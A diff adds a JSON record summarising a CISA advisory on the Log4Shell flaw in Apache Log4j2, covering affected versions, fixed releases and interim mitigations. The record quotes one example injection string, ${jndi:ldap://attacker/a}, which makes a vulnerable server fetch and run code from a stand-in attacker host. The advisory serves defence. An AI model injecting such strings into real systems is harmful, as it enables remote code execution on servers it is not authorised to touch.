@@ -1,0 +1,9 @@
+{
+  "doc_id": "cti-log4shell-cisa",
+  "source": "cisa",
+  "url": "https://www.cisa.gov/news-events/alerts/2021/12/10/apache-log4j-vulnerability",
+  "date": "2021-12-10",
+  "title": "Apache Log4j Remote Code Execution Vulnerability (Log4Shell)",
+  "text": "Apache Log4j2 releases 2.0-beta9 through 2.14.1 evaluate message-lookup substitutions on the data they log, and the JNDI resolver will fetch and instantiate a remote Java object when a string such as ${jndi:ldap://attacker/a} is written to a log. Because almost any field an application records, an HTTP header, a username, a chat line, can carry that string, the reachable surface is enormous and needs no authentication. Apache shipped a first fix in 2.15.0, then hardened it in 2.16.0 by disabling message lookups outright and in 2.17.0 by resolving a separate denial-of-service. NVD assigns the maximum base score, 10.0. CISA directed organizations to inventory where Log4j is embedded, upgrade to 2.17.x, and, where an upgrade cannot happen at once, remove the JndiLookup class from the classpath as an interim measure.",
+  "mentions_cves": ["CVE-2021-44228"]
+}
